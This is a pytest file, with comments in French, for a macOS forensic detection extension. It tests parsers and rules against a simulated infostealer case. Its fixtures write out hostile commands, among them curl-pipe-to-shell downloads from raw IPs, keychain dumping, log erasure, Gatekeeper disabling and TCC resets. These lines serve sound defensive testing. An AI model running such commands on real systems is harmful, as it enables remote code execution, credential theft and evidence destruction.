#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Extension macOS (phoenix_dfir_mcp/ext/macos.py).

Parsers de chaque format (journal unifie exporte, TCC.db, quarantaine,
KnowledgeC, plists launchd / emond / LoginHook, cron, periodic, FSEvents),
detections positives ET negatives (references de base sans alerte),
references de preuve citables et validees (y compris apres redemarrage),
routage applicable(), et enquete a cinq phases de bout en bout sur le cas
voleur d'informations avec un LLM simule."""

import gzip
import hashlib
import importlib.util
import json
import os
import plistlib
import re
import shutil
import sqlite3

import pytest

_ROOT = os.path.join(os.path.dirname(__file__), '..', '..')

from phoenix_dfir_mcp import evaluation, evidence_db, memory, pathpolicy, phases, toolkit  # noqa: E402
from phoenix_dfir_mcp.ext import _macos_formats as mf  # noqa: E402
from phoenix_dfir_mcp.ext import _macos_fsevents as fse  # noqa: E402
from phoenix_dfir_mcp.ext import _macos_rules as rules  # noqa: E402
from phoenix_dfir_mcp.ext import macos  # noqa: E402

SUITE = os.path.join(_ROOT, 'eval', 'suite')
STEALER = os.path.join(SUITE, 'macos_launchagent_infostealer')
BENIGN = os.path.join(SUITE, 'macos_benign_admin')
LABEL = 'com.apple.softwareupdate.helper'
HELPER = '/Users/alice/Library/Application Support/.helperd/helperd'

_spec = importlib.util.spec_from_file_location('build_macos_cases',
                                               os.path.join(_ROOT, 'eval', 'build_macos_cases.py'))
builder = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(builder)

ST = {
    'quarantine': os.path.join(STEALER, 'com.apple.LaunchServices.QuarantineEventsV2'),
    'tcc': os.path.join(STEALER, 'TCC_system'),
    'log': os.path.join(STEALER, 'unifiedlog_mbp-alice.ndjson'),
    'agent': os.path.join(STEALER, f'LaunchAgents_{LABEL}.plist'),
    'keystone': os.path.join(STEALER, 'LaunchAgents_com.google.keystone.agent.plist'),
    'fsevents': os.path.join(STEALER, '00000000004f1a2b'),
}
PARSER = {'quarantine': 'macos_parse_quarantine', 'tcc': 'macos_parse_tcc', 'log': 'macos_parse_unifiedlog',
          'agent': 'macos_parse_persistence', 'keystone': 'macos_parse_persistence',
          'fsevents': 'macos_parse_fsevents'}


@pytest.fixture(autouse=True)
def _isolation():
    pathpolicy.reset()
    toolkit.reset_evidence_index()
    toolkit.set_active_case(None)
    yield
    pathpolicy.reset()
    toolkit.reset_evidence_index()
    toolkit.set_active_case(None)


def _hunt(path):
    result = toolkit.run_tool('macos_hunt', {'file_path': str(path)})
    assert not result.get('error'), result
    return result


def _rules(result):
    return {f['rule'] for f in result['findings']}


def _by_rule(result, rule):
    return [f for f in result['findings'] if f['rule'] == rule]


def _techniques(result):
    return {t.strip() for f in result['findings'] for t in f['mitre'].split(',')}


def _write(path, data):
    path.write_bytes(data if isinstance(data, bytes) else data.encode('utf-8'))
    return str(path)


def _ndjson(path, entries):
    return _write(path, '\n'.join(builder.ndjson_entry(*e[:4], **(e[4] if len(e) > 4 else {}))
                                  for e in entries) + '\n')


# ============================================================================
# Detection du type, routage, enregistrement de l'extension
# ============================================================================

def test_detection_par_le_contenu():
    assert mf.detect(ST['quarantine'])['type'] == 'quarantine'
    assert mf.detect(ST['tcc'])['type'] == 'tcc'
    assert mf.detect(ST['log'])['type'] == 'unifiedlog_ndjson'
    assert mf.detect(ST['agent'])['type'] == 'launchd_plist'  # plist binaire
    assert mf.detect(ST['keystone'])['type'] == 'launchd_plist'  # plist XML
    assert mf.detect(ST['fsevents'])['type'] == 'fsevents'
    assert mf.detect(os.path.join(BENIGN, 'unifiedlog_admin.log'))['type'] == 'unifiedlog_text'
    assert mf.detect(os.path.join(BENIGN, 'admin.crontab'))['type'] == 'crontab'


def test_artefacts_non_macos_non_revendiques(tmp_path):
    for case in os.listdir(SUITE):
        if case.startswith('macos_'):
            continue
        for name in os.listdir(os.path.join(SUITE, case)):
            path = os.path.join(SUITE, case, name)
            assert mf.detect(path)['type'] is None, (case, name)
            assert macos.applicable(path) is None, (case, name)
    info = tmp_path / 'Info.plist'
    info.write_bytes(plistlib.dumps({'CFBundleIdentifier': 'com.example.app', 'CFBundleVersion': '1'}))
    assert macos.applicable(str(info)) is None
    hist = tmp_path / 'History.db'
    import sqlite3
    conn = sqlite3.connect(hist)
    conn.execute('CREATE TABLE urls (id INTEGER PRIMARY KEY, url TEXT)')
    conn.commit()
    conn.close()
    assert macos.applicable(str(hist)) is None
    generic = tmp_path / 'events.ndjson'
    generic.write_text('{"timestamp": "2026-10-01T10:00:00Z", "message": "ok"}\n')
    assert mf.detect(str(generic))['type'] is None


def test_routage_applicable_et_couverture():
    groups, missing = toolkit.applicable_tools(ST['tcc'])
    assert groups == [('parsing macOS (tcc)', ('macos_parse_tcc',)), ('detection macOS', ('macos_hunt',))]
    assert not missing
    assert toolkit.applicable_tools(ST['log'])[0][0][1] == ('macos_parse_unifiedlog',)
    assert toolkit.applicable_tools(ST['agent'])[0][0][1] == ('macos_parse_persistence',)
    assert toolkit.applicable_tools(ST['fsevents'])[0][0][1] == ('macos_parse_fsevents',)


def test_tracev3_logarchive_et_btm(tmp_path):
    native = tmp_path / '0000000000000001.tracev3'
    native.write_bytes(b'\x00\x10\x00\x00binary')
    groups, missing = toolkit.applicable_tools(str(native))
    assert groups == [] and missing and 'log show' in missing[0]
    assert 'log show' in toolkit.run_tool('macos_parse_unifiedlog', {'file_path': str(native)})['error']
    assert toolkit.run_tool('macos_detect_artifact', {'file_path': str(native)})['type'] == 'tracev3'
    archive = tmp_path / 'system.logarchive'
    (archive / 'Persist').mkdir(parents=True)
    (archive / 'Persist' / '0000000000000001.tracev3').write_bytes(b'\x00\x10')
    shutil.copy(ST['log'], archive / 'export.ndjson')
    det = toolkit.run_tool('macos_detect_artifact', {'file_path': str(archive)})
    assert det['type'] == 'logarchive' and det['tracev3_files'] == 1
    assert [e['type'] for e in det['exports']] == ['unifiedlog_ndjson']
    refused = toolkit.run_tool('macos_parse_unifiedlog', {'file_path': str(archive)})
    assert 'error' in refused and refused['exports'][0]['path'].endswith('export.ndjson')
    btm = tmp_path / 'BackgroundItems-v9.btm'
    btm.write_bytes(b'bplist00\x00\x01')
    out = toolkit.run_tool('macos_parse_persistence', {'file_path': str(btm)})
    assert out['decoded'] is False and out['total_events'] == 0 and 'sfltool dumpbtm' in out['notes'][0]
    assert toolkit.applicable_tools(str(btm))[0] == [('parsing macOS (btm)', ('macos_parse_persistence',))]
    assert toolkit.run_tool('macos_hunt', {'file_path': str(btm)})['findings'] == []


def test_agent_phases_types_et_outils():
    assert toolkit.agent_for('macos_hunt') == 'Agent macOS'
    by_key = {p.key: p for p in phases.PHASES}
    for name in macos.TOOL_NAMES:
        assert name in toolkit.TOOLS and name in toolkit.READONLY_TOOLS
        assert name in by_key['extraction'].tools
    for name in macos.PARSERS + ('macos_hunt',):
        assert name in toolkit.INDEXED_TOOLS
    assert 'macos_hunt' in by_key['correlation'].tools
    assert 'macos_parse_unifiedlog' in by_key['extraction'].instructions
    assert 'macos_hunt' in by_key['correlation'].instructions
    assert '.plist' in toolkit._KNOWN_TYPES and '.tracev3' in toolkit._KNOWN_TYPES
    assert 'macos' not in toolkit.EXT_ERRORS


def test_outils_refusent_un_autre_type():
    assert 'error' in toolkit.run_tool('macos_parse_tcc', {'file_path': ST['quarantine']})
    err = toolkit.run_tool('macos_parse_quarantine', {'file_path': ST['tcc']})
    assert 'macos_parse_tcc' in err['error']
    auth = os.path.join(SUITE, 'ssh_bruteforce_valid_account', 'auth.log')
    assert 'error' in toolkit.run_tool('macos_parse_unifiedlog', {'file_path': auth})
    assert 'error' in toolkit.run_tool('macos_hunt', {'file_path': auth})


# ============================================================================
# Journal unifie
# ============================================================================

def test_unifiedlog_ndjson_normalise():
    out = toolkit.run_tool('macos_parse_unifiedlog', {'file_path': ST['log']})
    assert out['ref_kind'] == 'line' and out['total_events'] == 15
    ev = next(e for e in out['events'] if e.get('process') == 'osascript')
    assert ev['line'] == 7 and ev['timestamp'] == '2026-10-14T09:05:02Z'  # +0200 converti en UTC
    assert ev['pid'] == 1340 and ev['user'] == 'uid:501' and ev['process_path'] == '/usr/bin/osascript'
    assert ev['event_type'] == 'logEvent' and ev['message_type'] == 'Default' and ev['sender_image'] == 'osascript'
    tcc = next(e for e in out['events'] if e.get('subsystem') == 'com.apple.TCC')
    assert tcc['category'] == 'access' and tcc['user'] == 'root'
    assert all(not k.startswith('_') for e in out['events'] for k in e)


def test_unifiedlog_json_tableau_et_gzip(tmp_path):
    records = [json.loads(builder.ndjson_entry('2026-10-14T09:00:00Z', '/usr/bin/sudo', 10, 'hello')),
               json.loads(builder.ndjson_entry('2026-10-14T09:00:01Z', '/usr/bin/curl', 11,
                                               'curl -s https://x.example/a.sh | sh', offset='-0500'))]
    doc = tmp_path / 'log.json'
    doc.write_text(json.dumps(records, indent=2))
    out = toolkit.run_tool('macos_parse_unifiedlog', {'file_path': str(doc)})
    assert out['artifact_type'] == 'unifiedlog_json' and out['ref_kind'] == 'row'
    assert [e['row'] for e in out['events']] == [1, 2]
    assert out['events'][1]['timestamp'] == '2026-10-14T09:00:01Z'
    res = _hunt(doc)
    assert _by_rule(res, 'ul_download_exec')[0]['refs'][0] == {'artifact': 'log.json', 'kind': 'row', 'value': 2}
    gz = tmp_path / 'log.ndjson.gz'
    with gzip.open(gz, 'wb') as f:
        f.write(open(ST['log'], 'rb').read())
    assert toolkit.run_tool('macos_parse_unifiedlog', {'file_path': str(gz)})['total_events'] == 15


def test_unifiedlog_styles_texte(tmp_path):
    text = (
        'Timestamp                       Thread     Type        Activity             PID    TTL  \n'
        '2026-10-14 11:00:00.123456+0200 0x2f3a     Default     0x0                  123    0    '
        'softwareupdated: (SoftwareUpdateCore) [com.apple.SoftwareUpdate:SUOSUScan] Scan finished\n'
        '2026-10-14 11:00:01.000000+0200 0x2f3b     Error       0x0                  124    0    '
        'Google Chrome Helper: first line\n'
        'second line of the same message\n'
        '2026-10-14 11:00:02.000000+0200 0x2f3c     Default     0x0                  125    0    '
        'kernel: no subsystem here\n')
    path = _write(tmp_path / 'show.txt', text)
    out = toolkit.run_tool('macos_parse_unifiedlog', {'file_path': path})
    first, second, third = out['events']
    assert first['line'] == 2 and first['timestamp'] == '2026-10-14T09:00:00Z' and first['pid'] == 123
    assert first['subsystem'] == 'com.apple.SoftwareUpdate' and first['category'] == 'SUOSUScan'
    assert first['sender_image'] == 'SoftwareUpdateCore' and first['process'] == 'softwareupdated'
    assert second['process'] == 'Google Chrome Helper' and second['message_type'] == 'Error'
    assert second['message'] == 'first line\nsecond line of the same message' and second['line'] == 3
    assert third['line'] == 5 and 'subsystem' not in third
    syslog = _write(tmp_path / 'syslog.txt', (
        'Timestamp                       (process)[PID]    \n'
        '2026-10-14 11:00:00.123456+0200  MBP-ALICE sudo[2201]: alice : COMMAND=/usr/bin/xattr -c /tmp/x.app\n'
        '2026-10-14 11:00:05.000000+0200  MBP-ALICE tccd[188]: [com.apple.TCC:access] AUTHREQ_CTX\n'))
    out = toolkit.run_tool('macos_parse_unifiedlog', {'file_path': syslog})
    assert out['artifact_type'] == 'unifiedlog_text'
    assert out['events'][0]['host'] == 'MBP-ALICE' and out['events'][0]['pid'] == 2201
    assert out['events'][1]['subsystem'] == 'com.apple.TCC'
    assert _by_rule(_hunt(syslog), 'ul_quarantine_removal')[0]['refs'][0]['value'] == 2
    compact = _write(tmp_path / 'compact.txt', (
        'Timestamp               Ty Process[PID:TID]\n'
        '2026-10-14 11:00:00.123 Df launchd[1:2f3a] [com.apple.xpc.launchd:service] started\n'
        '2026-10-14 11:00:00.456 E  softwareupdated[412:3b] failure\n'))
    out = toolkit.run_tool('macos_parse_unifiedlog', {'file_path': compact})
    assert [e['message_type'] for e in out['events']] == ['Default', 'Error']
    assert out['events'][0]['timestamp'] == '2026-10-14T11:00:00Z' and 'heure locale' in out['notes'][0]


# ============================================================================
# Bases SQLite
# ============================================================================

def test_tcc_parse_schema_courant_et_ancien(tmp_path):
    out = toolkit.run_tool('macos_parse_tcc', {'file_path': ST['tcc']})
    assert out['schema'] == 'auth_value' and out['ref_kind'] == 'row' and out['total_events'] == 6
    helper = next(e for e in out['events'] if e['client'] == HELPER)
    assert helper['row'] == 6 and helper['service_label'] == 'Full Disk Access'
    assert helper['auth_value_label'] == 'allowed' and helper['auth_reason_label'] == 'system set'
    assert helper['client_type'] == 'path' and helper['csreq_present'] is False
    assert helper['timestamp'] == '2026-10-14T09:06:10Z'
    assert HELPER in out['summary']['path_clients']
    old = tmp_path / 'TCC.db'
    import sqlite3
    conn = sqlite3.connect(old)
    conn.execute('CREATE TABLE access (service TEXT, client TEXT, client_type INTEGER, allowed INTEGER, '
                 'prompt_count INTEGER, csreq BLOB, policy_id INTEGER, last_modified INTEGER)')
    conn.execute("INSERT INTO access VALUES ('kTCCServiceAccessibility', '/tmp/.x/agent', 1, 1, 0, NULL, NULL, "
                 "1500000000)")
    conn.commit()
    conn.close()
    out = toolkit.run_tool('macos_parse_tcc', {'file_path': str(old)})
    assert out['schema'] == 'allowed' and out['events'][0]['auth_value'] == 2
    found = _by_rule(_hunt(old), 'tcc_grant_user_writable')
    assert found and found[0]['severity'] == 'high' and 'T1564.001' in found[0]['mitre']


def test_quarantine_et_knowledgec(tmp_path):
    out = toolkit.run_tool('macos_parse_quarantine', {'file_path': ST['quarantine']})
    ev = next(e for e in out['events'] if e['row'] == 3)
    assert ev['timestamp'] == '2026-10-14T09:02:11Z' and ev['agent_name'] == 'Safari'
    assert ev['origin_url'] == builder.PHISH_ORIGIN and ev['data_url'] == builder.PHISH_DMG
    assert ev['quarantine_type'] == 'web download' and ev['download_host'] == 'invoice-viewer-cdn.top'
    kc = _write(tmp_path / 'knowledgeC.db', builder.knowledgec_db([
        ('/app/usage', 'com.apple.Safari', '2026-10-14T09:00:00Z', '2026-10-14T09:03:00Z'),
        ('/app/inFocus', 'com.apple.Terminal', '2026-10-14T09:04:00Z', '2026-10-14T09:05:30Z'),
        ('/device/isLocked', '', '2026-10-14T09:06:00Z', '2026-10-14T09:07:00Z')]))
    assert mf.detect(kc)['type'] == 'knowledgec'
    assert toolkit.applicable_tools(kc)[0] == [('parsing macOS (knowledgec)', ('macos_parse_knowledgec',))]
    out = toolkit.run_tool('macos_parse_knowledgec', {'file_path': kc})
    assert [e['bundle_id'] for e in out['events']] == ['com.apple.Safari', 'com.apple.Terminal']
    assert out['events'][1]['duration_s'] == 90 and out['events'][1]['row'] == 2
    assert toolkit.run_tool('macos_hunt', {'file_path': kc})['findings'] == []


def test_lecture_seule_sans_fichier_annexe(tmp_path):
    db = tmp_path / 'TCC.db'
    shutil.copy(ST['tcc'], db)
    before = hashlib.sha256(db.read_bytes()).hexdigest()
    toolkit.run_tool('macos_parse_tcc', {'file_path': str(db)})
    toolkit.run_tool('macos_hunt', {'file_path': str(db)})
    assert hashlib.sha256(db.read_bytes()).hexdigest() == before
    assert sorted(os.listdir(tmp_path)) == ['TCC.db']
    (tmp_path / 'TCC.db-wal').write_bytes(b'')
    assert 'wal' in toolkit.run_tool('macos_parse_tcc', {'file_path': str(db)})['notes'][0]


# ============================================================================
# Persistance
# ============================================================================

def test_launchd_parse_binaire_xml_et_portee(tmp_path):
    out = toolkit.run_tool('macos_parse_persistence', {'file_path': ST['agent']})
    ev = out['events'][0]
    assert out['ref_kind'] == 'row' and ev['row'] == 1 and ev['label'] == LABEL and ev['plist_format'] == 'binary'
    assert ev['program'] == HELPER and ev['run_at_load'] is True and ev['keep_alive'] is True
    assert ev['scope'] == 'LaunchAgent' and ev['program_arguments'] == f'{HELPER} --daemon'
    xml = toolkit.run_tool('macos_parse_persistence', {'file_path': ST['keystone']})['events'][0]
    assert xml['plist_format'] == 'xml' and xml['start_interval'] == 3523
    daemon = _write(tmp_path / 'com.example.plist', builder.launchd_plist(
        'com.example.svc', ['/usr/local/bin/svc'], UserName='root', KeepAlive={'SuccessfulExit': False}))
    ev = toolkit.run_tool('macos_parse_persistence', {'file_path': daemon})['events'][0]
    assert ev['scope'] == 'LaunchDaemon' and ev['keep_alive'] == 'conditional'
    path_scope = tmp_path / 'Library' / 'LaunchDaemons'
    path_scope.mkdir(parents=True)
    plist = _write(path_scope / 'x.plist', builder.launchd_plist('com.x', ['/tmp/x']))
    res = _hunt(plist)
    assert {'T1543.004'} <= _techniques(res) and 'T1543.001' not in _techniques(res)


def test_launchd_detections_positives():
    res = _hunt(ST['agent'])
    hidden = _by_rule(res, 'launchd_hidden_binary')[0]
    assert hidden['mitre'] == 'T1543.001,T1564.001' and hidden['severity'] == 'high'
    assert hidden['label'] == LABEL and hidden['program'] == HELPER
    assert hidden['refs'] == [{'artifact': os.path.basename(ST['agent']), 'kind': 'row', 'value': 1}]
    masq = _by_rule(res, 'launchd_apple_masquerade')[0]
    assert masq['mitre'] == 'T1543.001,T1036.005'
    assert 'Masquerading' in masq['mitre_name']


@pytest.mark.parametrize('argv,rule,technique,severity', [
    (['/bin/sh', '-c', 'curl -fsSL http://45.9.1.2/i.sh | sh'], 'launchd_download_exec', 'T1105', 'critical'),
    (['/usr/bin/osascript', '-e', 'do shell script "id"'], 'launchd_applescript', 'T1059.002', 'high'),
    (['/usr/bin/python3', '-c', 'import os;os.system("id")'], 'launchd_python_inline', 'T1059.006', 'high'),
    (['/bin/bash', '-c', 'echo aWQ= | base64 -D | bash'], 'launchd_decode', 'T1140', 'high'),
    (['/Users/Shared/updater'], 'launchd_user_writable', 'T1543.001', 'high'),
    (['/private/tmp/agent'], 'launchd_user_writable', 'T1543.001', 'high'),
])
def test_launchd_commandes_suspectes(tmp_path, argv, rule, technique, severity):
    path = _write(tmp_path / 'LaunchAgents_com.example.agent.plist',
                  builder.launchd_plist('com.example.agent', argv, RunAtLoad=True))
    found = _by_rule(_hunt(path), rule)
    assert found and technique in found[0]['mitre'] and found[0]['severity'] == severity


def test_launchd_references_de_base_sans_alerte(tmp_path):
    for name in os.listdir(BENIGN):
        if name.endswith('.plist'):
            assert _hunt(os.path.join(BENIGN, name))['findings'] == [], name
    assert _hunt(ST['keystone'])['findings'] == []
    disabled = _write(tmp_path / 'LaunchAgents_com.x.plist',
                      builder.launchd_plist('com.x', ['/tmp/.x/run'], Disabled=True))
    assert _hunt(disabled)['findings'] == []
    apple = _write(tmp_path / 'com.apple.mdworker.plist',
                   builder.launchd_plist('com.apple.mdworker', ['/System/Library/Frameworks/CoreServices.framework/'
                                                                'Frameworks/Metadata.framework/mdworker']))
    assert _hunt(apple)['findings'] == []


def test_emond_loginhook_cron_periodic(tmp_path):
    emond = _write(tmp_path / 'rules.plist', plistlib.dumps([
        {'name': 'sample rule', 'enabled': False, 'eventTypes': ['startup'],
         'actions': [{'type': 'RunCommand', 'command': '/bin/echo', 'arguments': ['x']}]},
        {'name': 'update', 'enabled': True, 'eventTypes': ['startup'],
         'actions': [{'type': 'RunCommand', 'command': '/bin/sh', 'arguments': ['-c', '/tmp/.u/run']}]}]))
    assert mf.detect(emond)['type'] == 'emond_rules'
    parsed = toolkit.run_tool('macos_parse_persistence', {'file_path': emond})
    assert [e['row'] for e in parsed['events']] == [1, 2]
    found = _by_rule(_hunt(emond), 'emond_run_command')
    assert len(found) == 1 and found[0]['mitre'] == 'T1546.014' and found[0]['refs'][0]['value'] == 2
    hook = _write(tmp_path / 'com.apple.loginwindow.plist',
                  plistlib.dumps({'LoginHook': '/Library/Scripts/.h.sh', 'lastUserName': 'alice'}))
    assert _by_rule(_hunt(hook), 'login_hook')[0]['mitre'] == 'T1037.002'
    tabs = tmp_path / 'usr' / 'lib' / 'cron' / 'tabs'
    tabs.mkdir(parents=True)
    cron = _write(tabs / 'alice', '# DO NOT EDIT\nSHELL=/bin/sh\n0 9 * * * /usr/local/bin/backup.sh\n'
                  '*/10 * * * * curl -s http://91.2.3.4/p.sh | bash\n@reboot /Users/alice/.cache/.d/agent\n')
    assert mf.detect(cron)['type'] == 'crontab'
    parsed = toolkit.run_tool('macos_parse_persistence', {'file_path': cron})
    assert [e['line'] for e in parsed['events']] == [3, 4, 5] and parsed['events'][0]['user'] == 'alice'
    res = _hunt(cron)
    by_line = {f['refs'][0]['value']: f for f in res['findings']}
    assert 3 not in by_line
    assert by_line[4]['rule'] == 'cron_download_exec' and 'T1053.003' in by_line[4]['mitre']
    assert by_line[5]['rule'] == 'cron_suspicious_path' and by_line[5]['mitre'] == 'T1053.003'
    etc = tmp_path / 'etc'
    etc.mkdir()
    system = _write(etc / 'crontab', '17 * * * * root cd / && run-parts --report /etc/cron.hourly\n')
    ev = toolkit.run_tool('macos_parse_persistence', {'file_path': system})['events'][0]
    assert ev['user'] == 'root' and ev['command'].startswith('cd /')
    periodic = tmp_path / 'etc' / 'periodic' / 'daily'
    periodic.mkdir(parents=True)
    script = _write(periodic / '999.local', '#!/bin/sh\necho ok\npython3 -c "import os"\n')
    assert mf.detect(script)['type'] == 'periodic'
    found = _by_rule(_hunt(script), 'periodic_python_inline')
    assert found and found[0]['mitre'] == 'T1053,T1059.006' and found[0]['refs'][0] == {
        'artifact': '999.local', 'kind': 'line', 'value': 3}
    assert _hunt(os.path.join(BENIGN, 'admin.crontab'))['findings'] == []


# ============================================================================
# TCC, quarantaine, journal unifie : detections
# ============================================================================

def test_tcc_detections_et_references_de_base(tmp_path):
    res = _hunt(ST['tcc'])
    assert len(res['findings']) == 1
    grant = res['findings'][0]
    assert grant['rule'] == 'tcc_grant_user_writable' and grant['severity'] == 'critical'
    assert grant['mitre'] == 'T1548.006,T1564.001' and grant['service'] == 'kTCCServiceSystemPolicyAllFiles'
    assert grant['refs'] == [{'artifact': 'TCC_system', 'kind': 'row', 'value': 6}]
    db = _write(tmp_path / 'TCC.db', builder.tcc_db([
        ('kTCCServiceScreenCapture', '/usr/bin/python3', 1, 2, 2, builder.CSREQ, '2026-10-01T10:00:00Z'),
        ('kTCCServiceMicrophone', '/opt/tools/rec', 1, 2, 2, None, '2026-10-01T10:00:00Z'),
        ('kTCCServiceCamera', '/Users/bob/Downloads/cam', 1, 2, 2, None, '2026-10-01T10:00:00Z'),
        ('kTCCServiceCamera', '/Users/bob/Downloads/denied', 1, 0, 2, None, '2026-10-01T10:00:00Z'),
        ('kTCCServiceAppleEvents', '/bin/zsh', 1, 2, 2, builder.CSREQ, '2026-10-01T10:00:00Z',
         'com.apple.finder')]))
    res = _hunt(db)
    by_row = {f['refs'][0]['value']: f for f in res['findings']}
    assert by_row[1]['rule'] == 'tcc_grant_interpreter' and by_row[1]['mitre'] == 'T1548.006,T1113'
    assert by_row[2]['rule'] == 'tcc_grant_unsigned' and by_row[2]['mitre'] == 'T1548.006,T1123'
    assert by_row[3]['rule'] == 'tcc_grant_user_writable' and by_row[3]['severity'] == 'high'
    assert 'T1125' in by_row[3]['mitre']
    assert 4 not in by_row and 5 not in by_row  # refus, AppleEvents d'un shell signe
    assert _hunt(os.path.join(BENIGN, 'TCC_system'))['findings'] == []


def test_quarantine_detections(tmp_path):
    res = _hunt(ST['quarantine'])
    assert len(res['findings']) == 1
    f = res['findings'][0]
    assert f['rule'] == 'quarantine_suspicious_origin' and f['mitre'] == 'T1204.002' and f['severity'] == 'high'
    assert f['origin_url'] == builder.PHISH_ORIGIN and f['refs'][0]['value'] == 3
    db = _write(tmp_path / 'QuarantineEventsV2', builder.quarantine_db([
        ('A', '2026-10-01T10:00:00Z', 'com.apple.Safari', 'Safari', 'http://185.1.2.3/x.pkg', 0, 't', None),
        ('B', '2026-10-01T10:01:00Z', 'com.apple.mail', 'Mail', 'file:///Users/b/Library/Mail/x/Facture.app.zip',
         2, 'Facture.app.zip', None, 'billing@example.net'),
        ('C', '2026-10-01T10:02:00Z', 'com.apple.Safari', 'Safari', 'https://bit.ly/3abc', 0, 't', None),
        ('D', '2026-10-01T10:03:00Z', 'com.apple.Safari', 'Safari', 'https://www.mozilla.org/firefox.dmg', 0, 't',
         'https://www.mozilla.org/')]))
    by_row = {f['refs'][0]['value']: f for f in _hunt(db)['findings']}
    assert by_row[1]['severity'] == 'high' and 'IP' in by_row[1]['title']
    assert by_row[2]['rule'] == 'quarantine_mail_executable' and by_row[2]['mitre'] == 'T1566.001'
    assert by_row[3]['severity'] == 'medium'  # raccourcisseur, fichier non executable
    assert 4 not in by_row
    assert _hunt(os.path.join(BENIGN, 'com.apple.LaunchServices.QuarantineEventsV2'))['findings'] == []


def test_unifiedlog_detections_cas_voleur():
    res = _hunt(ST['log'])
    expected = {'ul_quarantine_removal': ('T1553.001', 5), 'ul_password_prompt': ('T1059.002,T1056.002', 7),
                'ul_keychain_access': ('T1555.001', 8), 'ul_tcc_grant_suspicious': ('T1548.006', 10),
                'ul_curl_upload': ('T1041', 13)}
    assert _rules(res) == set(expected)
    for rule, (mitre, line) in expected.items():
        f = _by_rule(res, rule)[0]
        assert f['mitre'] == mitre and f['refs'] == [{'artifact': os.path.basename(ST['log']), 'kind': 'line',
                                                      'value': line}], rule


def test_unifiedlog_regles_unitaires_et_benin(tmp_path):
    entries = [
        ('2026-10-14T10:00:00Z', '/usr/sbin/spctl', 10, 'spctl --master-disable'),
        ('2026-10-14T10:00:01Z', '/usr/bin/osascript', 11,
         'osascript -e do shell script "curl -s http://a.example/x | sh" with administrator privileges'),
        ('2026-10-14T10:00:02Z', '/usr/bin/tccutil', 12, 'tccutil reset All com.example.edr'),
        ('2026-10-14T10:00:03Z', '/usr/bin/log', 13, 'log erase --all'),
        ('2026-10-14T10:00:04Z', '/usr/sbin/screencapture', 14, 'screencapture -x /tmp/.s/1.png'),
        ('2026-10-14T10:00:05Z', '/usr/bin/security', 15, 'security dump-keychain -d login.keychain'),
        ('2026-10-14T10:00:06Z', '/usr/bin/security', 16, 'security find-certificate -a -c Apple'),
        ('2026-10-14T10:00:07Z', '/usr/bin/xattr', 17, 'xattr -l /Applications/Safari.app'),
        ('2026-10-14T10:00:08Z', '/usr/bin/osascript', 18, 'osascript -e display notification "ok"'),
        ('2026-10-14T10:00:09Z', '/usr/bin/curl', 19, 'curl -F file=@report.pdf https://intranet.corp.example/up'),
    ]
    res = _hunt(_ndjson(tmp_path / 'u.ndjson', entries))
    by_line = {f['refs'][0]['value']: f['rule'] for f in res['findings']}
    assert by_line[1] == 'ul_gatekeeper_disabled' and by_line[3] == 'ul_tcc_tamper'
    assert by_line[4] == 'ul_log_tamper' and by_line[5] == 'ul_silent_screencapture'
    assert by_line[6] == 'ul_keychain_access'
    assert {'ul_applescript_shell', 'ul_download_exec'} <= {f['rule'] for f in res['findings']
                                                            if f['refs'][0]['value'] == 2}
    assert not {7, 8, 9, 10} & set(by_line)
    benign = _hunt(os.path.join(BENIGN, 'unifiedlog_admin.log'))
    assert benign['findings'] == [] and benign['events_analyzed'] == 11


# ============================================================================
# FSEvents
# ============================================================================

def test_fsevents_versions_et_drapeaux(tmp_path):
    recs = [('/Users/a/x.txt', 10, builder.CREATED | builder.IS_FILE, 501),
            ('/Users/a/dir', 11, builder.FOLDER_CREATED | builder.IS_DIR, 502)]
    for version in (1, 2, 3):
        path = _write(tmp_path / f'v{version}', builder.fsevents_bytes(recs, version=version))
        out = toolkit.run_tool('macos_parse_fsevents', {'file_path': path})
        assert out['versions'] == [version] and out['total_events'] == 2, version
        first = out['events'][0]
        assert first['path'] == '/Users/a/x.txt' and first['fsevent_id'] == 10 and first['row'] == 1
        assert first['flag_names'] == 'IsFile,Created' and first['flags'] == '0x01008000'
        assert ('inode' in first) == (version >= 2) and (version == 1 or first['inode'] == 501)
    assert fse.decode_flags(0x02040000) == ['ExtendedAttrRemoved', 'Removed']
    assert fse.decode_flags(0x88000000) == ['Renamed', 'FolderCreated']


def test_fsevents_borne_et_robuste(tmp_path):
    recs = [(f'/Users/a/f{i}', i, builder.MODIFIED | builder.IS_FILE, i) for i in range(1, 151)]
    raw = gzip.decompress(builder.fsevents_bytes(recs, per_page=50))
    multi = _write(tmp_path / 'multi', gzip.compress(raw[:len(raw) // 2], mtime=0)
                   + gzip.compress(raw[len(raw) // 2:], mtime=0))  # plusieurs membres gzip
    out = toolkit.run_tool('macos_parse_fsevents', {'file_path': multi})
    assert out['pages'] == 3 and out['total_events'] == 150 and 'preview' not in out
    capped = toolkit.run_tool('macos_parse_fsevents', {'file_path': multi, 'max_records': 20})
    assert capped['total_events'] == 20 and capped['truncated']
    plain = _write(tmp_path / 'plain', raw[:-7])  # non compresse, page finale tronquee
    out = toolkit.run_tool('macos_parse_fsevents', {'file_path': plain})
    assert 0 < out['total_events'] < 150 and any('tronquee' in n for n in out['notes'])
    garbage = _write(tmp_path / 'garbage', gzip.compress(raw[:40] + b'XXXX' + b'\x00' * 40, mtime=0))
    events, stats = fse.parse(garbage)
    assert stats['notes'] and len(events) <= 2
    cut = _write(tmp_path / 'cut', builder.fsevents_bytes(recs)[:-30])  # flux gzip tronque
    events, stats = fse.parse(cut)
    assert stats['notes'] and len(events) < 150
    events, stats = fse.parse(multi, max_bytes=1000)
    assert stats['truncated'] and len(events) < 150


def test_fsevents_detections(tmp_path):
    res = _hunt(ST['fsevents'])
    staging = _by_rule(res, 'fsevents_staging_cleanup')[0]
    assert staging['mitre'] == 'T1070.004' and set(staging['paths']) == {
        '/private/tmp/.zz/Chrome_Login_Data', '/private/tmp/.zz/login.keychain-db', '/private/tmp/.zz/out.zip'}
    assert {r['value'] for r in staging['refs']} == {11, 12, 13, 14, 15, 16}
    assert _by_rule(res, 'fsevents_xattr_removed')[0]['refs'][0]['value'] == 6
    plist = _by_rule(res, 'fsevents_launch_item_apple_name')[0]
    assert plist['mitre'] == 'T1543.001,T1036.005' and plist['refs'][0]['value'] == 9
    assert '/private/var/folders' not in json.dumps(res['findings'])
    ransom = [(f'/Users/a/Documents/doc{i}.docx.locked', 100 + i, builder.RENAMED | builder.IS_FILE, i)
